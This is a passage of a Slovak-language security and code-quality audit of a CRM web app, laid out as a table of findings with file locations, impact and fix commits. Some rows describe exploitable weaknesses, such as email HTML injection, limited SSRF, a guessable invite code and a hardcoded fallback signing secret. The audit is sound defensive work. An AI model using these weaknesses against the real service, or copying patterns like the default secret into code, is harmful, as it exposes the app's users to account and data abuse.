| NÍZKA | `server/routes/workspaces.js:495` | Zmena metadát workspace / regenerácia kódu neinvaliduje cache žiadateľa — GET /current vracia 60 s staré dáta | Po regenerácii kódu môže UI pri refetchi zobraziť starý (už neplatný) kód; vypnutie inviteCodeEnabled sa v GET /current prejaví až po minúte. | `19e175c1` |
| NÍZKA | `server/routes/workspaces.js:514` | Zoznam členov padne na 500, ak populate userId vráti null (zmazaný používateľ) | Jedna osirelá membership znefunkční stránku Členovia pre celý tím na všetkých platformách. | `dba9a683` |
| NÍZKA | `server/routes/workspaces.js:541` | ObjectId parametre (memberId, newOwnerId, invitationId) nie sú validované → CastError → 500 namiesto 400 | Falošné 500 v logoch/Diagnostike a mätúca správa pre klienta pri chybnom ID; zbytočný šum v monitoringu. | `69da3c46` |
| NÍZKA | `server/routes/workspaces.js:659` | Sekvenčné createNotification v slučke + zbytočný dotaz na leavingUser | Latencia odchodu rastie lineárne s počtom adminov; potenciálna 500 po už vykonanom odchode. | `767b1e9a` |
| NÍZKA | `server/routes/workspaces.js:707` | Prevod vlastníctva nie je atomický — pri zlyhaní ostane workspace bez vlastníka | Nikto nemôže workspace zmazať ani previesť vlastníctvo (requireWorkspaceOwner padne pre všetkých); plan-limity sa počítajú podľa zlého ownerId. | `0efa115e` |
| NÍZKA | `server/routes/workspaces.js:770` | E-mail v pozvánke nie je validovaný (typ, formát, dĺžka) | Nezmyselné záznamy pozvánok, zbytočné SMTP chyby/bounce, možnosť zahltiť pozvánky dlhými reťazcami; 500 pri chybnom payloade. | `6c894235` |
| NÍZKA | `server/routes/workspaces.js:772` | Chýbajúce `typeof` kontroly pred `.toLowerCase()/.trim()` (objekt v tele → 500) | Nekontrolované 500 chyby, šum v error monitoringu, možnosť odoslať pozvánku na nevalidný e-mail. | `6c894235` |
| NÍZKA | `server/routes/workspaces.js:818` | PLAN_LIMIT pri pozvánke vracia 400, inde 403 — nekonzistentný status kód | Nekonzistentné API (ťažšie testovanie a monitoring plan-gate hitov podľa status kódu); dokumentácia planGate.js hovorí o 403. | `3671970d` |
| NÍZKA | `server/routes/workspaces.js:967` | Pozvánka nie je viazaná na pozvaný e-mail a jej prijatie nie je atomické | Preposlaný/uniknutý odkaz pozvánky umožní vstup do workspace komukoľvek s účtom (nie len pozvanej osobe), prípadne viacerým osobám naraz; kapacitná kontrola (L1012) sa dá pretekom prekročiť. | `23e9472a` |
| NÍZKA | `server/routes/workspaces.js:1018` | Prijatie pozvánky: WorkspaceMember.create bez ošetrenia E11000 → pri dvojkliku 500 napriek úspechu; limit miest je check-then-act | Mätúca chyba pre používateľa (musí znova kliknúť, pozvánka sa javí ako neprijatá), falošné 5xx v Diagnostike; prekročenie plánového limitu členov o 1 pri súbehu. | `ac530779` |
| NÍZKA | `server/services/adminEmailService.js:32` | SMTP transporter bez timeoutov — pozvánka čaká v request path | Visiace HTTP requesty pri výpadku SMTP, horší UX na mobile (WebView timeouty), zbytočne držané konekcie na Render Starter. | `7b816d2f` |
| NÍZKA | `server/services/adminEmailService.js:64` | Neescapované používateľské hodnoty v admin/welcome/reset emailoch | HTML injekcia do mailboxu admina (vložený odkaz/obrázok, rozbitý layout) pri registrácii s podvrhnutým username; pri welcome/reset ide o self-targeted obsah (nízky dopad). | `129b3640` |
| NÍZKA | `server/services/announcementsService.js:113` | Whitelist kontrola announcementu prepustí zdedené názvy vlastností (constructor, __proto__…) | Zápis nezamýšľaných kľúčov do vlastného profilu usera; pri `__proto__` závisí správanie od BSON deserializácie (moderné `bson` používa defineProperty — prototype pollution neoverené, ale whitelist je obídený). | `de5e4c7f` |
| NÍZKA | `server/services/apiMetrics.js:35` | Neobmedzený rast counters.routes — kľúčom je surová req.path pre requesty bez matchnutej routy (404 skeny) | Bežný internetový scanner alebo úmyselný útočník (100 req/min/IP cez apiLimiter = ~144k unikátnych kľúčov/deň/IP, každý s objektom ~200 B) zväčšuje heap o desiatky MB denne; na Render Starter s 512 MB to vedie k postupnému OOM re… | `aa4e7477` |
| NÍZKA | `server/services/dueDateChecker.js:925` | setInterval/setTimeout schedulera sa nikdy nečistia, nemajú unref a scheduleDueDateChecks nemá ochranu proti dvojitému volaniu | Šum chýb pri každom nasadení, nemožnosť čistého vypnutia schedulera, riziko duplicitných behov. | `b434dd78` |
| NÍZKA | `server/services/fcmService.js:150` | FCM: device.save() v tom istom try ako send() – doručený push sa pri zlyhaní save započíta ako „Send failed“ | Zavádzajúce logy a metriky pri DB problémoch; sťažená diagnostika Android pushu. | `9ef6df77` |
| NÍZKA | `server/services/messageFileMigration.js:101` | getPendingMigrationCount robí neindexovaný full-scan kolekcie a admin UI ho počas migrácie volá každé 2 s | Zbytočná záťaž Mongo Atlas (free/shared tier) počas migrácie, spomalenie samotnej migrácie aj bežných requestov. | `5cabb3a3` |
| NÍZKA | `server/services/notificationService.js:172` | Nové HTTP/2 TLS spojenie na Apple pre každé zariadenie a každú notifikáciu | Vyššia latencia a réžia pri každom iOS pushi; riziko throttlingu zo strany Apple pri väčšom objeme. | `ebd7d5e7` |
| NÍZKA | `server/services/notificationService.js:338` | APNs token s BadDeviceToken v oboch prostrediach sa nikdy nezmaže – 2 zbytočné APNs volania pri každej notifikácii | Trvalá zbytočná záťaž (2 TLS spojenia na Apple na každú notifikáciu za každý mŕtvy token), šum v logoch „Send failed“. | `d02aa514` |
| NÍZKA | `server/services/notificationService.js:473` | generateNotificationUrl vkladá identifikátory do deep-linku bez URL-encodovania | Rozbité alebo manipulované deep-linky v push notifikáciách (web, iOS, Android) pre ostatných členov workspace; nízky dopad vďaka relatívnej URL a server-side kontrole členstva. | `904aa902` |
| NÍZKA | `server/services/notificationService.js:579` | webpush.sendNotification bez timeout – zavesený push endpoint blokuje fan-out používateľa | Zaseknuté doručovanie web push pre používateľa pri problémoch push služby; postupná akumulácia otvorených spojení a nevyriešených promise. | `5831dd8b` |
| NÍZKA | `server/services/notificationService.js:586` | Web push: zlyhanie sub.save() po úspešnom doručení vedie k opakovanému odoslaniu (duplicitná notifikácia) | Používateľ dostane tú istú push notifikáciu 2–3×; skreslené metriky. | `ff89f824` |
| NÍZKA | `server/services/notificationService.js:610` | Web push: neopakovateľné chyby (400/401/403/413) sa aj tak posielajú 3×, failed metrika sa inkrementuje 3× | Zbytočné požiadavky na Google/Mozilla/Apple push služby (riziko rate-limitu pri 403 kvôli VAPID), skreslené metriky a logy. | `f26eaf5a` |
| NÍZKA | `server/services/notificationService.js:712` | Preferencia pushOverdue je mŕtva – typy 'task.overdue'/'subtask.overdue' nikde neexistujú | Používateľ si vypne push „po termíne“ a naďalej ho dostáva; naopak vypnutie „deadlines“ vypne aj overdue. | `11ac42c9` |
| NÍZKA | `server/services/notificationService.js:797` | trimUserHistory beží po KAŽDOM inserte – 2 dotazy navyše na každú notifikáciu, duplikuje TTL index | Dvojnásobný počet čítacích dotazov pri každej notifikácii; pri fan-oute na M členov 2·M dotazov navyše. | `4ac8b068` |
| NÍZKA | `server/services/notificationService.js:855` | Duplicitné dotazy na APNsDevice/FcmDevice pri každej notifikácii | Zbytočná záťaž Mongo pri každej notifikácii; pri aktívnych workspacoch násobí počet dotazov. | `8ccba7e1` |
| NÍZKA | `server/services/oauthService.js:176` | `generateUniqueUsername` robí až 101 sekvenčných dopytov a pri súbehu končí E11000 → zlyhanie prihlásenia | Pomalšie OAuth registrácie pri obľúbených menách; občasné zlyhanie prvého prihlásenia pri súbehu. | `3e9a9d15` |
| NÍZKA | `server/services/oauthService.js:282` | Natvrdo zapísané osobné e-maily ako default `PRO_EMAILS` a päťkrát duplikovaná logika limitu miest | Únik PII cez repozitár, riziko nekonzistentných limitov medzi flow-mi, ťažšia údržba. | `b983106f` |
| NÍZKA | `server/services/serverErrorService.js:140` | recordError: findOne → save nie je atomické — pri súbežnom prvom výskyte padne na E11000 a inkrementy count sa strácajú | Diagnostika pri incidentoch (keď na nej záleží najviac) stráca prvé výskyty a podhodnocuje frekvenciu chýb; errorAlerter (prahy „>10 nových chýb/h") dostáva skreslený signál. | `5f2bfd57` |
| NÍZKA | `server/services/serverErrorService.js:162` | ServerError.workspaceId sa nikdy nevyplní — číta neexistujúce req.user.workspaceId | V Diagnostike nie je možné zistiť, ktorého tenanta sa 5xx chyby týkajú (napr. či sa problém s prílohami týka jedného workspace alebo všetkých). | `adc2114c` |
| NÍZKA | `server/services/serverErrorService.js:166` | Do ServerError.context sa ukladá surový req.query a req.params — scrubovanie citlivých polí platí len pre body | Únik jednorazových tokenov (odhlásenie z emailov, prípadne budúce query-tokeny) do diagnostickej kolekcie dostupnej superadminovi a do DB dumpov; porušuje princíp, že diagnostika nesmie niesť tajomstvá. | `36325d0f` |
| NÍZKA | `server/services/subscriptionEmailService.js:39` | SMTP transporter bez connection/socket timeoutov — zaseknutý SMTP blokuje celý reminder cron | Pri problémoch SMTP providera sa pripomienky neodošlú včas a prvý request používateľa po expirácii plánu môže trvať minúty (middleware čaká na `sendExpired`). | `08389192` |
| NÍZKA | `server/services/subscriptionEmailService.js:132` | formatDateSk formátuje dátum v časovej zóne servera (UTC na Render) — posun o deň oproti slovenskému času | Nesúlad dátumu expirácie v e-maili vs. v aplikácii (napr. 'vyprší 31. mája' vs. '1. júna'), zbytočné support otázky. | `08389192` |
| NÍZKA | `server/services/subscriptionEmailService.js:141` | Fallback `'dev-secret-change-me'` pre podpisovanie unsubscribe tokenov | Pri behu bez JWT_SECRET by sa dali sfalšovať unsubscribe tokeny (odhlásenie cudzích používateľov z e-mailov). | `08389192` |
| NÍZKA | `server/services/subscriptionEmailService.js:345` | Neescapovaný `user.username` (a `discount.reason`) v HTML e-mailových šablónach — HTML injection | Rozbité/podvrhnuté e-maily (phishingový obsah v legitímnom maile od PrplCRM, poškodenie reputácie odosielateľa), tracking pixel v admin preview; pri zrušení `sandbox` by išlo o stored XSS v admin paneli. | `08389192` |
| NÍZKA | `server/services/subscriptionEmailService.js:742` | Porovnanie HMAC podpisu unsubscribe tokenu nie je konštantné v čase | Teoretický timing side-channel pri hádaní podpisu (128-bit HMAC — prakticky veľmi náročné cez sieť); hygienický nedostatok na verejnom neautentifikovanom endpointe. | `08389192` |
| NÍZKA | `server/utils/logger.js:50` | Winston logger bez 'error' listenera — chyba zápisu File transportu v produkcii zhodí proces | Problém s diskom (plný disk, read-only FS pri zmene runtime, chýbajúce práva) zhodí celý API server namiesto toho, aby sa iba prestalo logovať do súboru; súbory na Renderi sa navyše pri každom deployi strácajú, takže prínos File … | `90625fbd` |
| NÍZKA | `server/utils/uploadFilter.js:20` | Blocklist spustiteľných prípon nepokrýva `.js` (Windows Script Host) a ďalšie bežné malvér vektory | Člen tímu (alebo kompromitovaný účet) vie do zdieľaného dokumentového skladu nahrať `.js`/`.xll`/`.msix`, kolega ho stiahne a spustí – blocklist tým stráca zmysel pre najbežnejšie reálne vektory. | `560b9db7` |
| INFO | `server/config/database.js:13` | Chýbajú listenery na mongoose.connection ('disconnected'/'reconnected'/'error') a zavádzajúca hláška o „JSON storage" | Horšia diagnostikovateľnosť výpadkov DB (nevidno dôvod odpojenia ani čas reconnectu); operátor môže z logu usúdiť, že appka beží v degradovanom režime s lokálnymi dátami. | `7ab44a82` |
| INFO | `server/jobs/commissionScheduler.js:62` | Sekvenčné findByIdAndUpdate v cykle namiesto bulkWrite | Zanedbateľný výkonový dopad dnes; uvádzam pre úplnosť spolu s race podmienkou v srv-admin-side-01. | `16c17741` |
| INFO | `server/models/User.js:371` | User.toJSON odstraňuje len password; Google OAuth tokeny, resetPasswordTokenHash a calendarFeedToken nie sú select:false ani stripnuté | Jediný budúci `res.json(user)` alebo populate bez projekcie prezradí Google refresh tokeny (plný prístup ku kalendáru/úlohám používateľa) a reset-token hash. | `56802124` |
| INFO | `server/models/Workspace.js:86` | Kód pozvánky má len 32 bitov entropie (8 hex znakov) a POST /workspaces/join nemá vlastný rate limit | Pri tisíckach workspace a distribuovanom útoku z viacerých IP je hádanie kódu v rádoch dní reálne → neoprávnený vstup do cudzieho workspace (s rolou defaultMemberRole). Dnes nízka pravdepodobnosť, ale rastie s počtom zákazníkov. | `050aada0` |
| INFO | `server/routes/admin.js:958` | Admin detail používateľa: 4 COLLSCAN-y (Contact.userId, Task.createdBy/assignedTo, Message.fromUserId/toUserId bez workspaceId prefixu) | Len admin UI; pri väčších dátach pomalé otvorenie detailu používateľa a krátkodobá záťaž DB. | `1319ec59` |
| INFO | `server/routes/admin.js:2172` | Stripe klient sa inicializuje pri načítaní modulu – bez STRIPE_SECRET_KEY server nenaštartuje; guardy `if (process.env.STRIPE_SECRET_KEY)` sú mŕtvy k… | Lokálny/staging beh bez Stripe kľúča nie je možný napriek tomu, že kód to zjavne zamýšľa; v produkcii bez dopadu. | `9e6e39b1` |
| INFO | `server/routes/admin.js:2709` | GET /performance/errors-by-route vracia metrics.hourly, ktoré getMetrics() neexportuje | Žiadny viditeľný dopad dnes, ale pole v API je trvalo prázdne a zavádza pri ďalšom vývoji. | `e84c0763` |
| INFO | `server/routes/admin.js:3313` | POST /migrate-encrypt-tokens: N+1 raw čítanie používateľov v slučke | Jednorazový migračný endpoint; pri stovkách používateľov trvá sekundy, nie kritické. | `902fed6c` |
| INFO | `server/routes/admin.js:3513` | POST /recover-task-files je hardcoded jednorazový recovery skript (incident 2026-05-13) stále živý v produkcii | Mŕtvy kód s potenciálom omylom modifikovať dáta kontaktov (ak by sa dnes našiel iný kontakt s rovnakým menom) a ťažký dotaz na blob kolekciu. | `902fed6c` |
| INFO | `server/routes/affiliate.js:61` | Affiliate vidí username cudzích používateľov (referredUserId populate) | Nízke — únik username (nie email) cudzích účtov affiliateovi; môže uľahčiť enumeráciu/sociálne inžinierstvo. | `82374377` |
| INFO | `server/routes/auth.js:60` | Avatar upload dôveruje MIME typu deklarovanému klientom (bez kontroly magic bytes) | Možnosť uložiť ne-obrázkové dáta (do 5 MB/používateľ) do MongoDB pod hlavičkou obrázka; žiadny priamy XSS vektor. | `6a30a0f0` |
| INFO | `server/routes/auth.js:590` | DEFAULT_NOTIFICATION_PREFS v route (false) nesúhlasí s defaultom modelu (true) | Mätúce UI – prepínač ukazuje vypnuté, ale notifikácie chodia (alebo naopak). | `6a30a0f0` |
| INFO | `server/routes/auth.js:1147` | Porovnanie `ADMIN_SECRET` nie je časovo konštantné | Teoretický timing side-channel na odhadnutie tajomstva (prakticky sťažený sieťovým šumom a ďalšími kontrolami). | `6a30a0f0` |
| INFO | `server/routes/billing.js:737` | PromoCode lookup podľa stripePromotionCodeId/stripeCouponId bez indexu v invoice.paid webhooku | Kolekcia je malá (admin-created kódy), dopad minimálny; uvádzam pre úplnosť cross-checku. | `56802124` |
| INFO | `server/routes/billingApple.js:185` | Apple notification webhook je pod všeobecným apiLimiter (100/min/IP), Stripe webhook nie — nekonzistentné | Oneskorené spracovanie Apple renewal/refund notifikácií pri väčšom objeme; dnes pri malom počte iOS predplatiteľov bez praktického dopadu. | `6e72629b` |
| INFO | `server/routes/emailUnsubscribe.js:57` | PII (email) v info logu | Zbytočné šírenie osobných údajov do logovacej infraštruktúry. | `4d94e9c1` |
| INFO | `server/routes/messages.js:367` | GET / vracia pevne posledných 100 správ bez stránkovania | Aktívne tímy stratia prístup k starším správam (napr. schválenia z minulého kvartálu). | `5cabb3a3` |
| INFO | `server/routes/pages.js:74` | Tichá truncácia title/content (substring) = strata dát bez chyby | Používateľ môže prísť o koniec dokumentu bez upozornenia (najmä pri vkladaní veľkých textov). | `871b52e6` |
| INFO | `server/routes/push.js:57` | Web push endpoint môže byť ľubovoľná HTTPS URL — server posiela požiadavky na hostiteľa zvoleného používateľom | Obmedzený SSRF: server dá vykonať POST s šifrovaným telom na ľubovoľný verejný HTTPS host; bez čítania odpovede. | `871b52e6` |
| INFO | `server/routes/tasks.js:1498` | Diagnostické logy na úrovni info pri každom PUT a 4× pri každom downloade | Šum v produkčných logoch (Render), sťažená diagnostika skutočných chýb a zbytočné náklady na logovanie. | `73d4691a` |
| INFO | `server/services/appleIap.js:115` | Sandbox fallback v produkcii priznáva reálny platený plán za sandbox (bezplatné) transakcie | Bezplatný prístup k plateným funkciám pre každého, kto sa dostane do TestFlight-u; skreslené metriky plateného plánu. | `6e72629b` |
| INFO | `server/services/oauthService.js:68` | `OAUTH_STATE_SECRET` kratší ako 32 znakov sa potichu ignoruje | Tichá misconfigurácia; žiadny priamy bezpečnostný dopad (derivovaný kľúč je dostatočne silný). | `3e9a9d15` |
| INFO | `server/services/oauthService.js:247` | Invitation.find podľa email+status pri každom OAuth logine bez indexu s prefixom email | Zanedbateľné pri súčasnej veľkosti; pri raste počtu pozvánok spomalí OAuth login. | `3e9a9d15` |
| INFO | `server/services/securityAudit.js:48` | workspaceId v bezpečnostných audit záznamoch je vždy null — req.user.workspaceId nikde neexistuje | Admin Diagnostika nevie filtrovať bezpečnostné udalosti podľa tenanta; forenzná stopa pri cross-workspace pokusoch je neúplná. | `adc2114c` |

**Klient (web, PWA, iOS/Android WebView) — 158 nálezov**

| Závažnosť | Súbor:riadok | Čo bolo zlé | Prečo to vadilo | Commit |
|---|---|---|---|---|
| VYSOKÁ | `client/src/pages/BillingPage.jsx:97` | Stripe Checkout/Portal sa otvára cez window.open po await – Safari/Firefox ho blokujú ako popup | Používatelia Safari (vrátane všetkých iPhone/iPad prehliadačov) a Firefoxu sa nedostanú na platbu ani do Stripe portálu – kľúčový monetizačný tok je na týchto platformách tichо nefunkčný. | `f63d1f31` |
| STREDNÁ | `client/public/manifest.json:6` | PWA `start_url: "/"` otvára marketingovú landing page namiesto aplikácie | Prihlásený používateľ nainštalovanej PWA (Android Chrome / iOS A2HS) pri každom spustení vidí reklamný landing a login sa mu otvorí mimo PWA — aplikácia v standalone okne ostane na landingu. | `e661489c` |
| STREDNÁ | `client/src/App.jsx:68` | RouteErrorBoundary chyby len console.error-uje - render chyby stranok a zlyhania lazy chunkov sa nedostanu do Diagnostiky | Produkcne pady jednotlivych stranok (najcastejsia trieda chyb) su pre admin Diagnostiku neviditelne; po deployi vidi pouzivatel cervene okno s tlacidlom namiesto automatickeho reloadu. | `1bae4cf5` |
| STREDNÁ | `client/src/App.jsx:523` | WorkspaceSetup prekryva aj verejne stranky vratane /invite/:token | Prihlaseny pouzivatel bez prostredia nevie prijat pozvanku cez odkaz z emailu (stranka sa nikdy nezobrazi) a nevie si precitat pravne stranky. Primarny tok cez /login?invite= funguje, ale priame otvorenie odkazu po prihlaseni je … | `5611a979` |
| STREDNÁ | `client/src/api/api.js:73` | Interceptor automaticky opakuje aj ne-idempotentne JSON POST/PUT/DELETE po timeoute/vypadku siete - riziko duplicit | Duplicitne kontakty, spravy, ulohy, komentare a workspaces pri slabom signale alebo cold starte; duplicitne push notifikacie kolegom. 503 (DB-readiness) je bezpecne opakovat, timeout pri POST nie. | `6702a3e4` |
| STREDNÁ | `client/src/components/NotificationPreferences.jsx:90` | Push toggle skrytý podľa UA → na Android TWA/PWA a iOS PWA sa web push nedá spravovať, Android FCM diagnostika je nedosiahnuteľná | Používateľ TWA/PWA, ktorý zavrel PushPermissionBanner („Neskôr“ = 7 dní) alebo odmietol povolenie, nemá v appke žiadne UI na zapnutie/vypnutie push; testovacia notifikácia a FCM diagnostika pre Android sú mŕtvy kód, hoci boli nap… | `fe96453d` |
| STREDNÁ | `client/src/components/NotificationToast.jsx:66` | Klik na toast ignoruje workspaceId notifikácie → naviguje v nesprávnom prostredí | Multi-workspace používateľ klikne na toast zo správy/úlohy v inom prostredí → stránka sa otvorí v aktuálnom prostredí, položka sa nenájde (highlight nič neoznačí), používateľ si myslí, že notifikácia je rozbitá. | `93584beb` |
| STREDNÁ | `client/src/components/UserMenu.jsx:183` | Päť nezávislých 30 s pollerov notifikácií na jednej stránke (UserMenu poll aj na desktope, kde sa nepoužíva) | Zbytočná záťaž servera a mobilnej batérie/dát (3× identický agregačný dotaz `Notification.aggregate` na užívateľa každých 30 s), na pozadí v PWA/WebView aj keď appka nie je v popredí. | `5bd24a61` |
| STREDNÁ | `client/src/components/UserMenu.jsx:233` | UserMenu volá backend cez surový axios namiesto zdieľanej inštancie api → obchádza 401 odhlásenie, retry, NOT_MEMBER/NO_WORKSPACE recovery a timeout | Po expirácii tokenu používateľ v profile/kalendári vidí len „Chyba pri…“ namiesto presmerovania na login; pri Render cold-starte ostane `googleCalendar.loading`/`calendarFeed.loading` visieť donekonečna (žiadny timeout); upgrade … | `b6a42d51` |
| STREDNÁ | `client/src/components/UserMenu.jsx:1417` | Enter pri vytváraní prostredia obchádza guard creatingWorkspaceSubmitting → duplicitné prostredia | Vznik duplicitných workspace-ov (s rovnakým názvom), ktoré používateľ musí ručne mazať; každý zbytočne zaberá limit plánu. | `63c4c21e` |
| STREDNÁ | `client/src/hooks/useSocket.js:17` | Kazde volanie useSocket() otvara vlastne Socket.io spojenie (8 miest v kode) | 4x viac otvorenych socketov na servera na pouzivatela (limity Render instancie, pamat), Mongo dotaz pri kazdej navigacii medzi strankami, vyssia spotreba baterie/dat na mobile, skreslene pocty online pouzivatelov v admin paneli. … | `8711c3e2` |
| STREDNÁ | `client/src/hooks/useSocket.js:21` | reconnectionAttempts: 5 - po kratkom vypadku siete ostane realtime natrvalo mrtve | Tiche zlyhanie realtime vrstvy (ziadne upozornenie, odznaky sa aktualizuju len 30 s pollingom, zoznamy uloh/sprav ostanu stale). Pouzivatel vidi stare data bez indikacie. | `78e34d06` |
| STREDNÁ | `client/src/pages/AdminPanel.jsx:565` | Server-side search bez debounce a bez ochrany pred stale odpoveďou; pri filtri + page reset dva requesty naraz | Zbytočná záťaž API (desiatky requestov na jedno hľadanie, každý s agregáciou lastLogin) a riziko, že tabuľka zobrazí dáta patriace k staršiemu filtru/strane než je v UI. | `dbbd8c85` |
| STREDNÁ | `client/src/pages/AdminPanel.jsx:895` | Zmena plánu v tabuľke používateľov otvorí detail modal (chýba stopPropagation na bunke) | Rýchla zmena plánu z tabuľky je prakticky nepoužiteľná – pri každom pokuse vyskočí modal a spustí sa zbytočný GET /api/admin/users/:id. | `2b7479e9` |
| STREDNÁ | `client/src/pages/AdminPanel.jsx:3367` | ActivityFeed: scroll listener pre „smart pause“ sa nikdy nepripojí (ref je null pri prvom efekte) | Auto-refresh (10 s) pokračuje aj keď admin číta staršie záznamy – nové eventy mu „skáču pod ruky“, presne to, čomu mala funkcia zabrániť. | `1566be9b` |
| STREDNÁ | `client/src/pages/AdminPanel.jsx:5285` | Export provízií (CSV) cez window.open bez Bearer tokenu – server vždy vráti 401 | Funkcia „📥 CSV“ v záložke Affiliate → Provízie je nefunkčná (vždy 401). Admin nevie exportovať výplaty provízií. | `51b0ae68` |
| STREDNÁ | `client/src/pages/CRM.jsx:591` | Mutácie kontaktov ignorujú odpoveď servera a spoliehajú sa výlučne na socket udalosti | Po výpadku socketu používateľ vytvorí/upraví/zmaže kontakt alebo premenuje súbor, operácia na serveri prebehne, ale UI ostane staré bez akejkoľvek hlášky – vyzerá to ako zlyhanie, používateľ akciu zopakuje (duplicitné kontakty). | `ff5e2e48` |
| STREDNÁ | `client/src/pages/LandingPage.jsx:75` | Odkazy „Prihlásiť sa“/„Vyskúšajte zadarmo“ s target=_blank – v nainštalovanej PWA otvoria Safari/externý prehliadač, prihlásenie neprebehne v appke | Používateľ PWA sa z domovskej obrazovky appky nevie prihlásiť vo vnútri appky; prihlásenie prebehne v prehliadači a PWA ostáva „odhlásená“ na landingu – PWA je prakticky nepoužiteľná bez ručného zadania /app. | `e661489c` |
| STREDNÁ | `client/src/pages/Login.jsx:261` | OAuth prihlásenie z pozvánky stráca invite token – pozvánka sa neprijme | Pozvaný používateľ, ktorý si zvolí „Pokračovať s Google/Apple“, skončí vo vlastnom prázdnom workspace (WorkspaceSetup) namiesto v pozvanom – pozvánka ostane nevyužitá a tím ho musí pozvať znova. | `64392853` |
| STREDNÁ | `client/src/pages/Messages.jsx:510` | Po odoslaní správy zo záložky Odoslané sa zoznam neobnoví | Odosielateľ po úspešnom odoslaní druhej a ďalšej správy z karty Odoslané nevidí novú správu v zozname, kým neprepne záložku alebo neobnoví stránku — vyzerá to ako zlyhanie odoslania a vedie k duplicitnému odoslaniu. | `351f76d8` |
| STREDNÁ | `client/src/pages/Messages.jsx:1325` | Rozpísaná úprava správy sa stratí pri každom refreshi na pozadí (efekt závisí od identity objektu msg) | Používateľ píše dlhší popis v úprave správy; kolega medzitým čokoľvek urobí v Správach (komentár, hlas) → rozpísaný text zmizne bez varovania. Strata rozpracovaných dát. | `4409934a` |
| STREDNÁ | `client/src/pages/Tasks.jsx:776` | CSV export nekontroluje response.ok — chybový JSON (403 plan gate / 401) sa uloží ako projekty.csv | Free používateľ namiesto hlášky o pláne dostane súbor s JSON obsahom; pri 401 sa stiahne chybová odpoveď. Používateľ nevie, prečo export 'nefunguje'. | `d5af8c84` |
| STREDNÁ | `client/src/pages/Tasks.jsx:778` | CSV export obchádza downloadBlob — v natívnych shelloch (Android WebView, iOS WKWebView) sa nič nestiahne | Používateľ v Android/iOS aplikácii klikne na CSV export a nestane sa nič — bez chybovej hlášky. Platiaci používatelia (Tím/Pro) majú funkciu v appke nefunkčnú. | `d5af8c84` |
| STREDNÁ | `client/src/styles/index.css:8180` | Plošné `button { min-width/min-height: 44px }` na dotyku nafukuje malé absolútne pozicionované tlačidlá | Na telefónoch sa v search/date inpute zobrazí 44px sivý kruh prekrývajúci text, ikony × v toastoch/notifikáciách a rozbaľovacie šípky podúloh zaberajú 44px a lámu kompaktný layout. | `18ff444a` |
| STREDNÁ | `client/src/styles/index.css:9924` | Shorthand `padding … !important` v mobilnej hlavičke ruší safe-area odsadenie pre PWA | V iOS home-screen PWA (a potenciálne v edge-to-edge Android WebView) je horná lišta aplikácie pod systémovým status barom — ovládacie prvky hlavičky sú ťažko klikateľné, text prekrytý hodinami/batériou. | `cdee2016` |
| STREDNÁ | `client/src/utils/reportError.js:198` | Error report posiela cele location.href vratane hash/query - OAuth JWT, reset token a invite token koncia v DB chyb | Platne prihlasovacie JWT a jednorazove reset/invite tokeny ulozene ako plaintext v databaze chyb; kazdy s pristupom do admin panela alebo DB zalohy ich moze zneuzit (prevzatie uctu kym token neexpiruje). | `0f78581a` |
| STREDNÁ | `client/src/utils/workspaceStorage.js:80` | safeGet/safeSet chrania getItem, ale pristup k window.sessionStorage/localStorage je mimo try - vynimka padne do axios request interceptora | V dotknutej konfiguracii prehliadaca kazdy API request skonci rejectom este pred odoslanim (interceptor hodi), appka je po prihlaseni nepouzitelna; inicializator WorkspaceContext zhodi render. | `44d09f52` |
| NÍZKA | `client/public/sw-push.js:12` | DEBUG=true v produkčnom service workeri loguje obsah notifikácií | Metadáta notifikácií (URL s ID entít, workspaceId) končia v konzole/logoch zariadenia prístupných cez devtools/`adb logcat`; zbytočný šum a drobný únik nízko-citlivých dát. | `a0054502` |
| NÍZKA | `client/src/App.jsx:398` | Priamy pristup k sessionStorage bez try/catch v effectoch AppContent (r. 398, 408, 410) | Pre dotknutych pouzivatelov biela obrazovka / chybova stranka hned po prihlaseni (effect na r. 403-434 bezi pri isAuthenticated=true), bez moznosti pokracovat. | `dd3ae0b8` |
| NÍZKA | `client/src/App.jsx:562` | <Navigate> bez replace na /login a chranenych routach - pasca na tlacidlo Spat | Tlacidlo Spat 'nefunguje' po prihlaseni a po redirecte z chranenej stranky; na Androide to posobi ako zaseknuta appka. | `faf3295f` |
| NÍZKA | `client/src/components/AnnouncementBanner.jsx:117` | AnnouncementModal overlay nemá triedu modal-overlay — chýba iOS zámok scrollu a Escape | Na iOS sa pri scrollovaní v oznámení hýbe stránka pod ním; na desktope sa modal nedá zavrieť klávesnicou. | `6cbcb4e7` |
| NÍZKA | `client/src/components/ConnectedAccounts.jsx:142` | Potvrdenie pripojenia účtu (?connected=) sa prečíta iba pri otvorenom modáli – po návrate z OAuth je modál zatvorený | Po pripojení Google/Apple účtu chýba spätná väzba; používateľ nevie, či sa akcia podarila (zvlášť v kombinácii s race v AuthCallback, nález 03). | `814e42aa` |
| NÍZKA | `client/src/components/ConnectedAccounts.jsx:210` | Tlačidlá na billing/upgrade/pripojené účty majú na dotykových zariadeniach výšku ~30-34 px | Horšia ovládateľnosť fakturácie a správy účtov na mobile, najmä pri odpájaní prihlasovacích metód (destruktívna akcia) a prepínaní obdobia. | `814e42aa` |
| NÍZKA | `client/src/components/DateTimeInputs.jsx:139` | onTouchStart otvára date/time picker už pri dotyku — scrollovanie formulára prstom cez input otvorí picker | Pri scrollovaní dlhého formulára (nový projekt, edit podúlohy) na mobile sa neželane otvorí picker dátumu/času a preruší scroll. | `6fbc2ca1` |
| NÍZKA | `client/src/components/FilePreviewModal.jsx:150` | Záložné stiahnutie cez <a download> je v shelloch tichý no-op a náhľad sa pri Stiahnuť sťahuje druhýkrát | Druhý prenos až 50 MB na mobilnej sieti pri každom „Stiahnuť“ z náhľadu; pri chybe siete v natívnej appke nič nenaznačí, že sťahovanie zlyhalo. | `2af13d9d` |
| NÍZKA | `client/src/components/HeaderLogo.jsx:30` | HeaderLogo polluje unread-by-workspace každých 30 s aj keď je karta/appka na pozadí | Zbytočné sieťové volania a batéria na mobile; oneskorený indikátor neprečítaných po návrate z pozadia. | `9fa32b87` |
| NÍZKA | `client/src/components/HelpGuide.jsx:8` | HelpGuide pristupuje k localStorage bez try/catch — pri zablokovanom úložisku padne celá stránka | Biela obrazovka / ErrorBoundary na každej stránke, ktorá renderuje HelpGuide (všetky hlavné stránky), u používateľov so zablokovaným úložiskom. | `72b96be0` |
